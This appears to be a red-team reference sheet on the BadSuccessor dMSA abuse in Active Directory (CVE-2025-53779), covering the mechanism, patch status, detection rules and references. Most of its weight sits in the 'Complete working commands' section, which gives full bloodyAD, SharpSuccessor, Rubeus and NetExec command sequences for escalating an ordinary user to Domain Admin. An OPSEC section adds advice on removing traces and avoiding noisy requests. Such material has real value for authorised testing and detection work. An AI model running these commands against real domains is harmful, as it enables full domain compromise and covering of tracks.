# dMSA Abuse — BadSuccessor (CVE-2025-53779)

ATT&CK: T1098 (Account Manipulation), T1558 (Steal/Forge Kerberos Tickets), T1078.002 (Domain
Accounts). CWE-269 (Improper Privilege Management), CWE-287 (Improper Authentication),
CWE-732 (Incorrect Permission Assignment on OUs).

## Theory / Mechanism

Windows Server 2025 introduced **delegated Managed Service Accounts (dMSA)** to replace legacy
service accounts (auto-rotated keys, Kerberoast-resistant). A dMSA can "supersede" a legacy account
through a *migration*: it inherits the predecessor's keys and privileges so services keep working.

**BadSuccessor** (Yuval Gordon / Akamai, May 2025) abuses this migration: an attacker who can create
or control a dMSA simulates a *completed* migration by writing two attributes —
`msDS-ManagedAccountPrecededByLink` → a privileged victim (e.g. a Domain Admin), and
`msDS-DelegatedMSAState = 2` (Completed). The KDC then builds the dMSA's PAC from the **victim's**
SIDs/groups (no validation pre-patch), and the dMSA can also retrieve the victim's key material —
i.e. authenticate as the Domain Admin **without ever touching the victim object**.

Required privilege is tiny: **CreateChild on any OU** (to create the dMSA) — plus the default
CreatorOwner write rights on objects you create. Akamai found 91% of audited environments had
non-DA principals with this. A single Server 2025 DC in the domain enables the path, even if dMSAs
aren't used elsewhere.

## Modern 2024-2026 status (verified)

- **CVE-2025-53779 — patched Aug 12 2025 (CVSS 7.2)**. Microsoft hardened **kdcsvc.dll**: the write
  to the link attribute still succeeds, but the KDC now requires a **mutual** migration pairing
  (attacker must control *both* sides) before issuing the inheriting ticket.
- **Technique survives the patch (Akamai, Oct 2025)**: BadSuccessor remains
  (1) a **credential & privilege acquisition primitive** when you control a target principal AND a
  dMSA, and (2) a **replication-free secrets-dump** path inside already-owned domains — see the
  `BadTakeover` BOF.
- **Logging is OFF by default** on Server 2025 for these events; SACLs must be enabled to see them.
- **Tooling**: SharpSuccessor (.NET, Logan Goins), `bloodyAD ... add badSuccessor`,
  `minikerberos getDmsa.py`, NetExec `badsuccessor` module, GhostPack/Rubeus PR, Cable (computer add).

## Complete working commands

### Recon: who can create dMSAs?
```powershell
# Akamai/SpecterOps scanner — enumerate OUs where non-privileged principals have CreateChild
powershell -ep bypass -File scripts/Get-BadSuccessorOUPermissions.ps1
# bloodyAD: confirm a writable OU and check for Server 2025 DC
bloodyAD -d corp.local -u user -p 'Pass' --host <DC_IP> get children 'OU=Workstations,DC=corp,DC=local'
```
```cypher
// BloodHound: OUs where owned principals can create child objects
MATCH p=(s)-[:CreateChild|GenericAll|WriteDacl]->(o:OU) WHERE s.owned=true RETURN p
```

### Exploit (Linux, bloodyAD) — user → DA
```bash
# 1. Create the dMSA in an OU you can write to
bloodyAD -d corp.local -u user -p 'Pass' --host dc01.corp.local \
  add dMSA 'OU=Workstations,DC=corp,DC=local' evildmsa
# 2. Weaponize: link to a Domain Admin + mark migration Completed (pre-patch path)
bloodyAD -d corp.local -u user -p 'Pass' --host dc01.corp.local \
  add badSuccessor evildmsa --target administrator
# 3. Authenticate as the dMSA -> inherits DA; retrieve keys/TGT
python3 getDmsa.py -u 'corp/evildmsa$' -p 'pass' -d corp.local -dc-ip <DC_IP>   # minikerberos
```

### Exploit (Windows toolchain, SharpSuccessor)
```powershell
# 1. Create a controlled computer account (need a machine identity to ask for the dMSA ticket)
Cable.exe computer /add /name:EVILPC$ /password:Evil123!
# 2. Add + weaponize the dMSA
SharpSuccessor.exe add /path:"OU=Workstations,DC=corp,DC=local" /account:EVILPC$ \
  /name:evildmsa /target:Administrator
# 3. TGT for the computer, then ST as Administrator context (dMSA PAC carries DA SIDs)
Rubeus.exe asktgt /user:EVILPC$ /password:Evil123! /domain:corp.local /dc:dc01.corp.local /nowrap
Rubeus.exe asktgs /service:cifs/dc01.corp.local /dmsa /opsec /ptt /ticket:<TGT>
```

### NetExec module
```bash
nxc ldap <DC_IP> -u user -p 'Pass' -M badsuccessor               # check exposure
nxc ldap <DC_IP> -u user -p 'Pass' -M badsuccessor -o ACTION=exploit TARGET=administrator OU='OU=Workstations,DC=corp,DC=local'
```

## Detection

```yaml
title: BadSuccessor - dMSA Object Created
logsource: { product: windows, service: security }
detection:
  sel: { EventID: 5137, ObjectClass: 'msDS-DelegatedManagedServiceAccount' }
  condition: sel
level: medium
---
title: BadSuccessor - Migration Link / State Write
logsource: { product: windows, service: security }
detection:
  link:  { EventID: 5136, AttributeLDAPDisplayName: 'msDS-ManagedAccountPrecededByLink' }
  state: { EventID: 5136, AttributeLDAPDisplayName: 'msDS-DelegatedMSAState' }
  condition: link or state
level: high
---
title: Hacktool SharpSuccessor Execution
logsource: { product: windows, category: process_creation }
detection:
  sel: { Image|endswith: '\SharpSuccessor.exe' }
  cli: { CommandLine|contains: ['/target:', 'PrecededByLink', 'msDS-DelegatedMSAState'] }
  condition: sel or cli
level: high
```
IOCs: creation of `msDS-DelegatedManagedServiceAccount` objects by non-Tier0 principals;
writes to `msDS-ManagedAccountPrecededByLink` / `msDS-DelegatedMSAState` (5136); 4769 TGS for a dMSA
SPN immediately after such writes; `SharpSuccessor.exe` / `getDmsa.py` artifacts.
**Note:** these 5136/5137 events require SACLs that are NOT configured by default on Server 2025.

## OPSEC

- Patched domains (Aug 2025+) block the one-way DA-inheritance path — confirm DC patch level first;
  post-patch you still get a creds/secrets primitive when you control both the dMSA and target.
- The attack creates a durable AD object (the dMSA) + attribute writes — delete the dMSA and clear
  the link/state attributes after use; remove any computer account you created.
- Enable nothing on the DC; all writes are over LDAP. Avoid noisy SPN requests — use `/opsec` in Rubeus.
- Document the exposure precisely (which OU, which principal had CreateChild) for the report.

## References
- Akamai — "Abusing dMSA for Privilege Escalation in AD" (Yuval Gordon, May 2025) and
  "BadSuccessor Is Dead, Long Live BadSuccessor(?)" (Oct 2025, post-patch analysis)
- Unit 42 (Palo Alto) — "When Good Accounts Go Bad: Exploiting dMSA"
- Microsoft / Help Net Security — CVE-2025-53779 (Aug 2025 Patch Tuesday)
- logangoins/SharpSuccessor; CravateRouge/bloodyAD; skelsec/minikerberos getDmsa.py; Pennyw0rth/NetExec
